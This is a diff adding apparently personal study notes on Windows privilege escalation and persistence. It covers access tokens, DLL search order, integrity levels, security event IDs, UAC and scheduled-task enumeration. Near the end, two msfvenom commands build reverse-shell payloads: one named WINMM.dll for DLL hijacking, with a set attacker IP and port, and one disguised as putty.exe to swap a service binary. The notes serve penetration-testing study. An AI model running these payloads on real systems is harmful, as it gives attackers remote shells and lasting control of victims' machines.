@@ -1,0 +1,61 @@
+Privilege Escalation, PErsistence & Covering Your Tracks
+    
+    Windows Access Control Module
+        Access Tokens
+            SID associations and Token associations
+        Security Descriptors
+            DACL
+            SACL
+            ACEs
+            
+    DLL Search Order 
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+        The directory the the Application was run from
+        The directory specified in in the C+ function GetSystemDirectory()
+        The directory specified in the C+ function GetWindowsDirectory()
+        The current directory
+    Windows Integrity Mechanism
+        Untrusted
+            Anonymous SID access tokens
+        Low
+            Everyone SID Access token
+        Medium
+            Authenticated Users
+        High
+            Admins
+        System
+            System Services
+            
+            
+            
+        IMPORTANT MICROSOFT EVENT ID
+            4624/4625
+                Successful/failed login
+            4720
+                Account created
+            4672
+                Administrative user logged on
+            7045
+                Service created
+            
+    UAC
+        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+        
+    AutoElevate Executables
+        Requested Execution Levels:
+            asInvoker
+            highestAvailable
+
+    Scheduled Tasks & Services
+        schtasks /query /fo LIST /v | Select-String -Pattern "Task to run" | Select-String -pattern "COM Handler" -NotMatch
+            
+            
+    on linux
+        msfvenom -p windows/shell_reverse_tcp LHOST=10.50.28.174 LPORT=4444 -f dll > WINMM.dll
+    scp to windows machine
+        if you cant send it from linux then pull it from windows
+    
+    
+    
+    Service
+        msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe > putty.exe
